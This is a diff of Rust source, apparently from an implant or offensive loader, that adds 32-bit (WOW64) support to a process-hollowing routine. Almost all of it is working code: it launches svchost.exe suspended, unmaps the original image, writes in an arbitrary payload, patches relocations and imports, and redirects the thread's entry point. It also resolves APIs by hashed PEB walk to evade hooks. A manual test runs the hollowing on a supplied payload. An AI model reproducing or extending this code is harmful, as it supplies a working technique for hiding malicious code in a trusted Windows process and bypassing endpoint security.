@@ -62,6 +62,33 @@ unsafe fn rva_to_file_offset(
     rva_to_file_offset_sections(rva, &descs)
 }
 
+/// PE32 variant of `rva_to_file_offset` for WOW64 payload handling.
+///
+/// # Safety
+///
+/// `nt` must point to a valid, fully-mapped `IMAGE_NT_HEADERS32` structure.
+/// The section headers immediately following it must also be valid and in-bounds.
+#[cfg(windows)]
+unsafe fn rva_to_file_offset32(
+    rva: usize,
+    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS32,
+) -> usize {
+    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
+    let first = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS32>())
+        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
+    let descs: Vec<SectionDesc> = (0..num_sections)
+        .map(|i| {
+            let sec = &*first.add(i);
+            SectionDesc {
+                virtual_address: sec.VirtualAddress as usize,
+                virtual_size: *sec.Misc.VirtualSize() as usize,
+                raw_offset: sec.PointerToRawData as usize,
+            }
+        })
+        .collect();
+    rva_to_file_offset_sections(rva, &descs)
+}
+
 /// M-26 Part E: load a DLL into our own process via `LdrLoadDll` (resolved via
 /// PEB walk) instead of the hookable `LoadLibraryA` IAT entry. Returns 0 on
 /// failure, in which case the caller leaves the corresponding IAT slot empty.
@@ -217,8 +244,9 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     };
     use winapi::um::winbase::CREATE_SUSPENDED;
     use winapi::um::winnt::{
-        CONTEXT, CONTEXT_FULL, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS64,
-        IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE, PAGE_READWRITE,
+        CONTEXT, CONTEXT_FULL, IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_FILE_HEADER,
+        IMAGE_NT_HEADERS64, IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_SIGNATURE, MEM_COMMIT,
+        MEM_RESERVE, PAGE_READWRITE,
     };
 
     // Resolve NtClose once; fall back to CloseHandle if unavailable
@@ -247,6 +275,28 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
 
     let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
     let e_lfanew = unsafe { (*dos).e_lfanew } as usize;
+    let nt_sig_off = e_lfanew;
+    let opt_magic_off = e_lfanew
+        .saturating_add(4)
+        .saturating_add(std::mem::size_of::<IMAGE_FILE_HEADER>());
+    if opt_magic_off + 2 > payload.len() {
+        return Err(anyhow!(
+            "hollow_and_execute: PE too small for OptionalHeader.Magic"
+        ));
+    }
+    if nt_sig_off + 4 > payload.len() {
+        return Err(anyhow!("hollow_and_execute: PE too small for NT signature"));
+    }
+    let nt_sig = u32::from_le_bytes(payload[nt_sig_off..nt_sig_off + 4].try_into().unwrap());
+    if nt_sig != IMAGE_NT_SIGNATURE {
+        return Err(anyhow!("hollow_and_execute: invalid NT signature"));
+    }
+    let opt_magic =
+        u16::from_le_bytes(payload[opt_magic_off..opt_magic_off + 2].try_into().unwrap());
+    if opt_magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC {
+        return unsafe { hollow_and_execute_pe32(payload) };
+    }
+
     if e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS64>() > payload.len() {
         return Err(anyhow!("hollow_and_execute: PE too small for NT headers"));
     }
@@ -494,6 +544,553 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
 }
 
 #[cfg(windows)]
+unsafe fn hollow_and_execute_pe32(payload: &[u8]) -> Result<()> {
+    use std::mem::zeroed;
+    use std::path::Path;
+    use std::ptr::null_mut;
+    use winapi::shared::basetsd::SIZE_T;
+    use winapi::um::handleapi::CloseHandle;
+    use winapi::um::memoryapi::{ReadProcessMemory, VirtualAllocEx, WriteProcessMemory};
+    use winapi::um::processthreadsapi::{
+        CreateProcessA, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA,
+    };
+    use winapi::um::winbase::CREATE_SUSPENDED;
+    use winapi::um::winnt::{
+        IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_HEADERS32,
+        IMAGE_NT_OPTIONAL_HDR32_MAGIC, IMAGE_NT_SIGNATURE, MEM_COMMIT, MEM_RESERVE,
+        PAGE_READWRITE, WOW64_CONTEXT, WOW64_CONTEXT_FULL,
+    };
+    use winapi::um::wow64apiset::{Wow64GetThreadContext, Wow64SetThreadContext};
+
+    // Resolve NtClose once; fall back to CloseHandle if unavailable.
+    let nt_close_addr = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
+        .and_then(|base| pe_resolve::get_proc_address_by_hash(base, pe_resolve::hash_str(b"NtClose\0")));
+    macro_rules! close_handle {
+        ($h:expr) => {
+            if let Some(addr) = nt_close_addr {
+                type NtCloseFn = unsafe extern "system" fn(*mut c_void) -> i32;
+                let nt_close: NtCloseFn = std::mem::transmute(addr as *const ());
+                nt_close($h);
+            } else {
+                CloseHandle($h);
+            }
+        };
+    }
+
+    let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
+    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
+        return Err(anyhow!("hollow_and_execute: invalid DOS signature"));
+    }
+    let e_lfanew = (*dos).e_lfanew as usize;
+    if e_lfanew + std::mem::size_of::<IMAGE_NT_HEADERS32>() > payload.len() {
+        return Err(anyhow!("hollow_and_execute: PE32 payload too small for NT headers"));
+    }
+
+    let nt = (payload.as_ptr() as usize + e_lfanew) as *const IMAGE_NT_HEADERS32;
+    if (*nt).Signature != IMAGE_NT_SIGNATURE {
+        return Err(anyhow!("hollow_and_execute: invalid NT signature"));
+    }
+    let opt_magic = (*nt).OptionalHeader.Magic;
+    if opt_magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC {
+        return Err(anyhow!(
+            "hollow_and_execute: expected PE32 payload (found OptionalHeader.Magic=0x{:x})",
+            opt_magic
+        ));
+    }
+
+    let image_size = (*nt).OptionalHeader.SizeOfImage as usize;
+    let preferred_base = (*nt).OptionalHeader.ImageBase as usize;
+    let entry_point_rva = (*nt).OptionalHeader.AddressOfEntryPoint as usize;
+    if image_size == 0 {
+        return Err(anyhow!("hollow_and_execute: PE32 payload has SizeOfImage=0"));
+    }
+    if entry_point_rva >= image_size {
+        return Err(anyhow!(
+            "hollow_and_execute: PE32 entry point RVA {entry_point_rva:#x} is outside image size {image_size:#x}"
+        ));
+    }
+
+    // PE32 images must fit entirely within the 32-bit virtual address range.
+    let image_end = (preferred_base as u64)
+        .checked_add(image_size as u64)
+        .ok_or_else(|| anyhow!("hollow_and_execute: PE32 image base+size overflow"))?;
+    if image_end > (u32::MAX as u64 + 1) {
+        return Err(anyhow!(
+            "hollow_and_execute: PE32 image does not fit in 32-bit address space \
+             (base={preferred_base:#x}, size={image_size:#x})"
+        ));
+    }
+
+    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| r"C:\Windows".to_string());
+    let wow64_path = format!("{}\\SysWOW64\\svchost.exe", sysroot);
+    let system32_path = format!("{}\\System32\\svchost.exe", sysroot);
+    let selected = if Path::new(&wow64_path).exists() {
+        wow64_path
+    } else {
+        system32_path
+    };
+    let host_path = format!("{}\0", selected);
+    let host = host_path.as_bytes();
+
+    let mut si: STARTUPINFOA = zeroed();
+    si.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
+    let mut pi: PROCESS_INFORMATION = zeroed();
+
+    let ok = CreateProcessA(
+        host.as_ptr() as _,
+        null_mut(),
+        null_mut(),
+        null_mut(),
+        0,
+        CREATE_SUSPENDED,
+        null_mut(),
+        null_mut(),
+        &mut si,
+        &mut pi,
+    );
+    if ok == 0 {
+        return Err(anyhow!(
+            "CreateProcessA failed: {}",
+            winapi::um::errhandlingapi::GetLastError()
+        ));
+    }
+
+    // Hollow original image via NtUnmapViewOfSection when possible.
+    let ntdll_base = pe_resolve::get_module_handle_by_hash(pe_resolve::hash_str(b"ntdll.dll\0"))
+        .unwrap_or(0);
+    if ntdll_base == 0 {
+        tracing::warn!("hollow_and_execute(pe32): ntdll base not found via PEB; original image will not be unmapped");
+    } else {
+        let unmap_addr = pe_resolve::get_proc_address_by_hash(
+            ntdll_base,
+            pe_resolve::hash_str(b"NtUnmapViewOfSection\0"),
+        )
+        .unwrap_or(0);
+        if unmap_addr == 0 {
+            tracing::warn!(
+                "hollow_and_execute(pe32): NtUnmapViewOfSection not resolved; skipping unmap"
+            );
+        } else {
+            type NtUnmapFn = extern "system" fn(*mut c_void, *mut c_void) -> i32;
+            let nt_unmap: NtUnmapFn = std::mem::transmute(unmap_addr);
+
+            let mut ctx: WOW64_CONTEXT = zeroed();
+            ctx.ContextFlags = WOW64_CONTEXT_FULL;
+            if Wow64GetThreadContext(pi.hThread, &mut ctx) == 0 {
+                tracing::warn!(
+                    "hollow_and_execute(pe32): Wow64GetThreadContext failed ({}); skipping unmap",
+                    winapi::um::errhandlingapi::GetLastError()
+                );
+            } else {
+                // In a newly-created WOW64 process, Ebx points to the 32-bit PEB.
+                let peb_ptr = ctx.Ebx as usize as *const u8;
+                let mut remote_image_base: u32 = 0;
+                ReadProcessMemory(
+                    pi.hProcess,
+                    peb_ptr.add(0x8) as _,
+                    &mut remote_image_base as *mut _ as _,
+                    std::mem::size_of::<u32>(),
+                    null_mut(),
+                );
+                if remote_image_base == 0 {
+                    tracing::warn!(
+                        "hollow_and_execute(pe32): remote_image_base is NULL; skipping unmap"
+                    );
+                } else {
+                    let unmap_status = nt_unmap(pi.hProcess, remote_image_base as usize as _);
+                    if unmap_status < 0 {
+                        tracing::warn!(
+                            "hollow_and_execute(pe32): NtUnmapViewOfSection returned 0x{:x}; continuing",
+                            unmap_status
+                        );
+                    }
+                }
+            }
+        }
+    }
+
+    // Allocate RW first; execute permissions are applied per-section later.
+    let remote_base_ptr = VirtualAllocEx(
+        pi.hProcess,
+        preferred_base as _,
+        image_size,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE,
+    );
+    let remote_base_ptr = if remote_base_ptr.is_null() {
+        let fallback = VirtualAllocEx(
+            pi.hProcess,
+            null_mut(),
+            image_size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+        if fallback.is_null() {
+            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
+            close_handle!(pi.hThread);
+            close_handle!(pi.hProcess);
+            return Err(anyhow!("VirtualAllocEx failed for PE32 hollowing"));
+        }
+        fallback
+    } else {
+        remote_base_ptr
+    };
+
+    let remote_base = remote_base_ptr as usize;
+    let remote_base32 = u32::try_from(remote_base)
+        .map_err(|_| anyhow!("hollow_and_execute: allocated PE32 base above 4GB ({remote_base:#x})"))?;
+    let mut written: SIZE_T = 0;
+
+    if WriteProcessMemory(
+        pi.hProcess,
+        remote_base_ptr,
+        payload.as_ptr() as _,
+        (*nt).OptionalHeader.SizeOfHeaders as usize,
+        &mut written,
+    ) == 0
+    {
+        winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
+        close_handle!(pi.hThread);
+        close_handle!(pi.hProcess);
+        return Err(anyhow!("WriteProcessMemory(headers, pe32) failed"));
+    }
+
+    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
+    let first_section = (nt as usize + std::mem::size_of::<IMAGE_NT_HEADERS32>())
+        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
+    for i in 0..num_sections {
+        let sec = &*first_section.add(i);
+        let raw_off = sec.PointerToRawData as usize;
+        let raw_sz = sec.SizeOfRawData as usize;
+        let virt_sz = *sec.Misc.VirtualSize() as usize;
+        let copy_sz = raw_sz.min(virt_sz);
+        if raw_off == 0 || raw_sz == 0 || raw_off + copy_sz > payload.len() || copy_sz == 0 {
+            continue;
+        }
+        let dst = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
+        if WriteProcessMemory(
+            pi.hProcess,
+            dst,
+            payload.as_ptr().add(raw_off) as _,
+            copy_sz,
+            &mut written,
+        ) == 0
+        {
+            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
+            close_handle!(pi.hThread);
+            close_handle!(pi.hProcess);
+            return Err(anyhow!("WriteProcessMemory(section {}, pe32) failed", i));
+        }
+    }
+
+    let delta = remote_base as isize - preferred_base as isize;
+    if delta != 0 {
+        let reloc_dir = &(*nt).OptionalHeader.DataDirectory
+            [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
+        if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
+            winapi::um::processthreadsapi::TerminateProcess(pi.hProcess, 1);
+            close_handle!(pi.hThread);
+            close_handle!(pi.hProcess);
+            return Err(anyhow!(
+                "hollow_and_execute(pe32): VirtualAllocEx at preferred base failed and PE has no relocation directory; cannot fix up"
+            ));
+        }
+        apply_relocations_remote32(pi.hProcess, remote_base, nt, payload, delta)?;
+    }
+
+    fix_iat_remote32(pi.hProcess, remote_base, nt, payload, &mut written)?;
+    apply_section_protections32(pi.hProcess, remote_base, nt);
+
+    winapi::um::processthreadsapi::FlushInstructionCache(
+        pi.hProcess,
+        remote_base as *mut c_void,
+        (*nt).OptionalHeader.SizeOfImage as usize,
+    );
+
+    let mut ctx: WOW64_CONTEXT = zeroed();
+    ctx.ContextFlags = WOW64_CONTEXT_FULL;
+    if Wow64GetThreadContext(pi.hThread, &mut ctx) == 0 {
+        tracing::warn!(
+            "hollow_and_execute(pe32): Wow64GetThreadContext failed before PEB image-base update ({}); skipping PEB write",
+            winapi::um::errhandlingapi::GetLastError()
+        );
+    } else {
+        let peb_ptr = ctx.Ebx as usize as *const u8;
+        WriteProcessMemory(
+            pi.hProcess,
+            peb_ptr.add(0x8) as _,
+            &remote_base32 as *const _ as _,
+            std::mem::size_of::<u32>(),
+            &mut written,
+        );
+
+        // For WOW64 startup context, Eax carries the user entry target.
+        ctx.Eax = remote_base32.wrapping_add(entry_point_rva as u32);
+        if Wow64SetThreadContext(pi.hThread, &ctx) == 0 {
+            tracing::warn!(
+                "hollow_and_execute(pe32): Wow64SetThreadContext failed ({}); continuing",
+                winapi::um::errhandlingapi::GetLastError()
+            );
+        }
+    }
+    ResumeThread(pi.hThread);
+
+    close_handle!(pi.hThread);
+    close_handle!(pi.hProcess);
+    Ok(())
+}
+
+#[cfg(windows)]
+unsafe fn apply_relocations_remote32(
+    hprocess: *mut c_void,
+    remote_base: usize,
+    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS32,
+    payload: &[u8],
+    delta: isize,
+) -> Result<()> {
+    use winapi::shared::basetsd::SIZE_T;
+    use winapi::um::memoryapi::{ReadProcessMemory, WriteProcessMemory};
+
+    let reloc_dir = &(*nt).OptionalHeader.DataDirectory
+        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_BASERELOC as usize];
+    if reloc_dir.VirtualAddress == 0 || reloc_dir.Size == 0 {
+        return Ok(());
+    }
+
+    let reloc_file_off = rva_to_file_offset32(reloc_dir.VirtualAddress as usize, nt);
+    let reloc_end_off = reloc_file_off + reloc_dir.Size as usize;
+    if reloc_end_off > payload.len() {
+        return Ok(());
+    }
+
+    let mut offset = reloc_file_off;
+    while offset + 8 <= reloc_end_off {
+        let page_rva =
+            u32::from_le_bytes(payload[offset..offset + 4].try_into().unwrap()) as usize;
+        let block_size =
+            u32::from_le_bytes(payload[offset + 4..offset + 8].try_into().unwrap()) as usize;
+        if block_size < 8 {
+            break;
+        }
+        let entries = (block_size - 8) / 2;
+        for i in 0..entries {
+            let entry_off = offset + 8 + i * 2;
+            if entry_off + 2 > reloc_end_off {
+                break;
+            }
+            let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
+            let typ = (entry >> 12) as u8;
+            let rel = (entry & 0x0FFF) as usize;
+            let target = (remote_base + page_rva + rel) as *mut c_void;
+            match typ {
+                // IMAGE_REL_BASED_HIGHLOW (PE32)
+                3 => {
+                    let mut val: u32 = 0;
+                    let mut rd: SIZE_T = 0;
+                    ReadProcessMemory(hprocess, target, &mut val as *mut _ as _, 4, &mut rd);
+                    let patched = (val as i32).wrapping_add(delta as i32) as u32;
+                    let mut wr: SIZE_T = 0;
+                    WriteProcessMemory(hprocess, target, &patched as *const _ as _, 4, &mut wr);
+                }
+                // IMAGE_REL_BASED_DIR64 (accepted for completeness)
+                10 => {
+                    let mut val: u64 = 0;
+                    let mut rd: SIZE_T = 0;
+                    ReadProcessMemory(hprocess, target, &mut val as *mut _ as _, 8, &mut rd);
+                    val = val.wrapping_add(delta as u64);
+                    let mut wr: SIZE_T = 0;
+                    WriteProcessMemory(hprocess, target, &val as *const _ as _, 8, &mut wr);
+                }
+                _ => {}
+            }
+        }
+        offset += block_size;
+    }
+    Ok(())
+}
+
+#[cfg(windows)]
+unsafe fn fix_iat_remote32(
+    hprocess: *mut c_void,
+    remote_base: usize,
+    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS32,
+    payload: &[u8],
+    written: &mut winapi::shared::basetsd::SIZE_T,
+) -> Result<()> {
+    use winapi::um::memoryapi::WriteProcessMemory;
+
+    let import_dir = &(*nt).OptionalHeader.DataDirectory
+        [winapi::um::winnt::IMAGE_DIRECTORY_ENTRY_IMPORT as usize];
+    if import_dir.VirtualAddress == 0 {
+        return Ok(());
+    }
+
+    let mut desc_off = rva_to_file_offset32(import_dir.VirtualAddress as usize, nt);
+    loop {
+        if desc_off + 20 > payload.len() {
+            break;
+        }
+        let orig_first_thunk_rva =
+            u32::from_le_bytes(payload[desc_off..desc_off + 4].try_into().unwrap()) as usize;
+        let name_rva =
+            u32::from_le_bytes(payload[desc_off + 12..desc_off + 16].try_into().unwrap()) as usize;
+        let first_thunk_rva =
+            u32::from_le_bytes(payload[desc_off + 16..desc_off + 20].try_into().unwrap()) as usize;
+        if name_rva == 0 {
+            break;
+        }
+
+        let name_off = rva_to_file_offset32(name_rva, nt);
+        let first_thunk_off = rva_to_file_offset32(first_thunk_rva, nt);
+        let thunk_rva_off = if orig_first_thunk_rva != 0 {
+            rva_to_file_offset32(orig_first_thunk_rva, nt)
+        } else {
+            first_thunk_off
+        };
+        if name_off >= payload.len() {
+            desc_off += 20;
+            continue;
+        }
+
+        let dll_name_bytes = &payload[name_off..];
+        let null_pos = dll_name_bytes
+            .iter()
+            .position(|&b| b == 0)
+            .unwrap_or(dll_name_bytes.len());
+        let dll_name_str = match std::str::from_utf8(&dll_name_bytes[..null_pos]) {
+            Ok(s) => s,
+            Err(_) => {
+                desc_off += 20;
+                continue;
+            }
+        };
+
+        let mut dll_name_nul = dll_name_str.to_ascii_lowercase().into_bytes();
+        dll_name_nul.push(0);
+        let hash = pe_resolve::hash_str(&dll_name_nul);
+        let dll_base = pe_resolve::get_module_handle_by_hash(hash)
+            .or_else(|| {
+                let h = ldr_load_local(dll_name_str);
+                if h == 0 { None } else { Some(h) }
+            })
+            .unwrap_or(0);
+        if dll_base == 0 {
+            tracing::warn!("fix_iat_remote32: could not find/load {}", dll_name_str);
+            desc_off += 20;
+            continue;
+        }
+
+        let mut thunk_off = thunk_rva_off;
+        let mut iat_rva = first_thunk_rva;
+        loop {
+            if thunk_off + 4 > payload.len() {
+                break;
+            }
+            let thunk_val =
+                u32::from_le_bytes(payload[thunk_off..thunk_off + 4].try_into().unwrap());
+            if thunk_val == 0 {
+                break;
+            }
+
+            let func_addr: usize = if (thunk_val & 0x8000_0000) != 0 {
+                let ord = (thunk_val & 0xFFFF) as u32;
+                let ep = local_get_export_addr_by_ordinal(dll_base, ord);
+                if ep.is_null() {
+                    tracing::warn!(
+                        "fix_iat_remote32: ordinal {} in {} unresolved",
+                        ord,
+                        dll_name_str
+                    );
+                    0
+                } else {
+                    ep as usize
+                }
+            } else {
+                let ibn_rva = thunk_val as usize;
+                let ibn_off = rva_to_file_offset32(ibn_rva, nt);
+                if ibn_off + 2 >= payload.len() {
+                    thunk_off += 4;
+                    iat_rva += 4;
+                    continue;
+                }
+                let name_start = ibn_off + 2;
+                let name_bytes = &payload[name_start..];
+                let nlen = name_bytes
+                    .iter()
+                    .position(|&b| b == 0)
+                    .unwrap_or(name_bytes.len());
+                let mut name_null = name_bytes[..nlen].to_vec();
+                name_null.push(0);
+                let hash = pe_resolve::hash_str(&name_null);
+                match pe_resolve::get_proc_address_by_hash(dll_base, hash) {
+                    Some(addr) => addr,
+                    None => {
+                        tracing::warn!(
+                            "fix_iat_remote32: {}!{} unresolved via PEB walk",
+                            dll_name_str,
+                            String::from_utf8_lossy(&name_null[..name_null.len().saturating_sub(1)])
+                        );
+                        0
+                    }
+                }
+            };
+
+            if func_addr != 0 {
+                let func_addr32 = u32::try_from(func_addr).map_err(|_| {
+                    anyhow!(
+                        "fix_iat_remote32: resolved address {func_addr:#x} for {} exceeds 32-bit range",
+                        dll_name_str
+                    )
+                })?;
+                let iat_remote = (remote_base + iat_rva) as *mut c_void;
+                WriteProcessMemory(hprocess, iat_remote, &func_addr32 as *const _ as _, 4, written);
+            }
+
+            thunk_off += 4;
+            iat_rva += 4;
+        }
+
+        desc_off += 20;
+    }
+
+    Ok(())
+}
+
+#[cfg(windows)]
+unsafe fn apply_section_protections32(
+    hprocess: *mut c_void,
+    remote_base: usize,
+    nt: *const winapi::um::winnt::IMAGE_NT_HEADERS32,
+) {
+    use winapi::um::memoryapi::VirtualProtectEx;
+    use winapi::um::winnt::{PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE};
+
+    const SCN_EXEC: u32 = 0x2000_0000;
+    const SCN_WRITE: u32 = 0x8000_0000;
+
+    let num_sections = (*nt).FileHeader.NumberOfSections as usize;
+    let first_section = (nt as usize + std::mem::size_of::<winapi::um::winnt::IMAGE_NT_HEADERS32>())
+        as *const winapi::um::winnt::IMAGE_SECTION_HEADER;
+    for i in 0..num_sections {
+        let sec = &*first_section.add(i);
+        let chars = sec.Characteristics;
+        let protect = match (chars & SCN_EXEC != 0, chars & SCN_WRITE != 0) {
+            (true, true) => PAGE_EXECUTE_READ,
+            (true, false) => PAGE_EXECUTE_READ,
+            (false, true) => PAGE_READWRITE,
+            (false, false) => PAGE_READONLY,
+        };
+        let virt_size = (*sec.Misc.VirtualSize() as usize).max(sec.SizeOfRawData as usize);
+        if virt_size == 0 {
+            continue;
+        }
+        let addr = (remote_base + sec.VirtualAddress as usize) as *mut c_void;
+        let mut old = 0u32;
+        VirtualProtectEx(hprocess, addr, virt_size, protect, &mut old);
+    }
+}
+
+#[cfg(windows)]
 unsafe fn apply_relocations_remote(
     hprocess: *mut c_void,
     remote_base: usize,
@@ -536,15 +1133,27 @@ unsafe fn apply_relocations_remote(
             let entry = u16::from_le_bytes(payload[entry_off..entry_off + 2].try_into().unwrap());
             let typ = (entry >> 12) as u8;
             let rel = (entry & 0x0FFF) as usize;
-            if typ == 10 {
-                // IMAGE_REL_BASED_DIR64
-                let target = (remote_base + page_rva + rel) as *mut c_void;
-                let mut val: u64 = 0;
-                let mut rd: SIZE_T = 0;
-                ReadProcessMemory(hprocess, target, &mut val as *mut _ as _, 8, &mut rd);
-                val = val.wrapping_add(delta as u64);
-                let mut wr: SIZE_T = 0;
-                WriteProcessMemory(hprocess, target, &val as *const _ as _, 8, &mut wr);
+            let target = (remote_base + page_rva + rel) as *mut c_void;
+            match typ {
+                // IMAGE_REL_BASED_DIR64 (PE32+)
+                10 => {
+                    let mut val: u64 = 0;
+                    let mut rd: SIZE_T = 0;
+                    ReadProcessMemory(hprocess, target, &mut val as *mut _ as _, 8, &mut rd);
+                    val = val.wrapping_add(delta as u64);
+                    let mut wr: SIZE_T = 0;
+                    WriteProcessMemory(hprocess, target, &val as *const _ as _, 8, &mut wr);
+                }
+                // IMAGE_REL_BASED_HIGHLOW (PE32)
+                3 => {
+                    let mut val: u32 = 0;
+                    let mut rd: SIZE_T = 0;
+                    ReadProcessMemory(hprocess, target, &mut val as *mut _ as _, 4, &mut rd);
+                    let patched = (val as i32).wrapping_add(delta as i32) as u32;
+                    let mut wr: SIZE_T = 0;
+                    WriteProcessMemory(hprocess, target, &patched as *const _ as _, 4, &mut wr);
+                }
+                _ => {}
             }
         }
         offset += block_size;
@@ -1308,6 +1917,43 @@ mod tests {
         // RVA 0x2100 is exactly one byte past .data (VA=0x2000, VS=0x100),
         // so it should fall through to the identity fallback.
         assert_eq!(rva_to_file_offset_sections(0x2100, &secs), 0x2100);
+    }
+
+    #[cfg(windows)]
+    #[test]
+    #[ignore] // Manual Windows test: requires an explicit 32-bit payload path.
+    fn hollow_and_execute_pe32_payload_succeeds() {
+        use winapi::um::winnt::{
+            IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_FILE_HEADER, IMAGE_NT_OPTIONAL_HDR32_MAGIC,
+            IMAGE_NT_SIGNATURE,
+        };
+
+        let payload_path = std::env::var("HOLLOWING_PE32_PAYLOAD")
+            .expect("set HOLLOWING_PE32_PAYLOAD to a valid 32-bit PE payload path");
+        let payload = std::fs::read(&payload_path)
+            .unwrap_or_else(|e| panic!("failed to read HOLLOWING_PE32_PAYLOAD={payload_path}: {e}"));
+
+        assert!(payload.len() >= 0x40, "PE32 payload too small");
+        let dos = payload.as_ptr() as *const IMAGE_DOS_HEADER;
+        unsafe {
+            assert_eq!((*dos).e_magic, IMAGE_DOS_SIGNATURE, "invalid DOS signature");
+            let e_lfanew = (*dos).e_lfanew as usize;
+            let sig_off = e_lfanew;
+            assert!(sig_off + 4 <= payload.len(), "missing NT signature");
+            let sig = u32::from_le_bytes(payload[sig_off..sig_off + 4].try_into().unwrap());
+            assert_eq!(sig, IMAGE_NT_SIGNATURE, "invalid NT signature");
+
+            let magic_off = e_lfanew + 4 + std::mem::size_of::<IMAGE_FILE_HEADER>();
+            assert!(magic_off + 2 <= payload.len(), "missing OptionalHeader.Magic");
+            let magic = u16::from_le_bytes(payload[magic_off..magic_off + 2].try_into().unwrap());
+            assert_eq!(
+                magic,
+                IMAGE_NT_OPTIONAL_HDR32_MAGIC,
+                "payload is not PE32 (OptionalHeader.Magic={magic:#x})"
+            );
+        }
+
+        super::hollow_and_execute(&payload).expect("PE32 hollowing succeeded");
     }
 
     #[test]
